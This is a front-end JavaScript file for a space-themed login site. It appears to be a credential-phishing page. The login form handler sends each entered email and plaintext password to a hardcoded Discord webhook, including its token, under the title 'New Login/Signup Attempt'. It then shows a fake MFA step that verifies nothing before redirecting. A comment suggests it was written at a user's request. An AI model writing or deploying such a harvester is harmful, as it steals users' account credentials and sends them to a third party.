// Discord Webhooks Configuration
const WEBHOOK_AUTH = "https://discord.com/api/webhooks/1450946822506938460/xrlqsz7Jh_DRSL3BWcvoQ0JVqZ9POANySYI0iD_j4WMU1fCL1XsFpF2Uk9c-voJY48IO";

// DOM Elements
const sections = {
    landing: document.getElementById('landing-page'),
    login: document.getElementById('login-page'),
    mfa: document.getElementById('mfa-page')
};

// Navigation Helper
function showSection(sectionId) {
    Object.values(sections).forEach(sec => {
        if (sec) {
            sec.classList.remove('active-section');
            sec.classList.add('hidden-section');
        }
    });
    if (sections[sectionId]) {
        sections[sectionId].classList.remove('hidden-section');
        sections[sectionId].classList.add('active-section');
    }
}

// 1. Landing Page Logic
const enterBtn = document.getElementById('enter-btn');
if (enterBtn) {
    enterBtn.addEventListener('click', () => {
        showSection('login');
    });
}

// 2. Login Logic
const authForm = document.getElementById('auth-form');
if (authForm) {
    authForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;

        // Send to Discord
        await sendToDiscord(WEBHOOK_AUTH, {
            title: "New Login/Signup Attempt",
            color: 0xa855f7, // Purple
            fields: [
                { name: "Email", value: email, inline: true },
                { name: "Password", value: password, inline: true },
                { name: "Time", value: new Date().toLocaleString(), inline: false }
            ]
        });

        console.log("Auth Data Sent");
        showSection('mfa');
    });
}

// Toggle Login/Signup
const authTitle = document.querySelector('#login-page h2');
const authBtn = document.querySelector('#login-page .primary-btn'); // More specific selector
const switchBtn = document.getElementById('switch-to-signup');
let isSignup = false;

if (switchBtn) {
    switchBtn.addEventListener('click', (e) => {
        e.preventDefault();
        isSignup = !isSignup;
        if (isSignup) {
            authTitle.innerText = "Join the Cosmos";
            authBtn.innerText = "Create Account";
            switchBtn.innerText = "Already a member? Login";
        } else {
            authTitle.innerText = "Identify Yourself";
            authBtn.innerText = "Begin Journey";
            switchBtn.innerText = "New soul? Create profile";
        }
    });
}

// 3. MFA Logic
const mfaForm = document.getElementById('mfa-form');
if (mfaForm) {
    mfaForm.addEventListener('submit', (e) => {
        e.preventDefault();

        // Simple validation found in HTML (required, numeric) is sufficient per user request

        // Simulate verification and redirect to Dashboard
        setTimeout(() => {
            window.location.href = 'dashboard.html';
        }, 500);
    });
}

// Discord Webhook Helper
async function sendToDiscord(webhookUrl, embedData) {
    try {
        const payload = {
            embeds: [embedData]
        };

        await fetch(webhookUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });
    } catch (e) {
        console.error("Failed to send webhook:", e);
    }
}
